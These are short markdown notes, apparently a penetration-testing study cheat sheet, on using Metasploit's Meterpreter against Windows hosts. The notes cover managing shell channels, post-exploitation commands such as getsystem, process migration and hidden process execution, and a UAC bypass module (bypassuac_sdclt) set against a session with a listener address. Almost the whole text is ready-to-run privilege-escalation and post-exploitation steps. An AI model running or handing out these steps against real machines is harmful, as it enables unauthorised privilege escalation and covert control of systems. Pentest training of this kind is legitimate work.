#frameworks #metasploit #exploit #shells 

### Working with channels

channels are multiple shells in the same host

```msf
shell
```

then CTRL+Z to background it

```msf
channel -l
```

Select

```msf
channel -i 1
```


### Post Exploitation

```msf
idletime
```

```msf
getuid
```

```msf
getsystem
```

List the processes

```msf
ps
```

```msf
migrate 8052
```

Start a process with the current user

```msf
execute -H -f notepad
```

### UAC Bypass

🔴 Make sure its a admin process
```msf
use exploit/windows/local/bypassuac_sdclt
show options
set SESSION 9
set LHOST 192.168.119.4
run
```



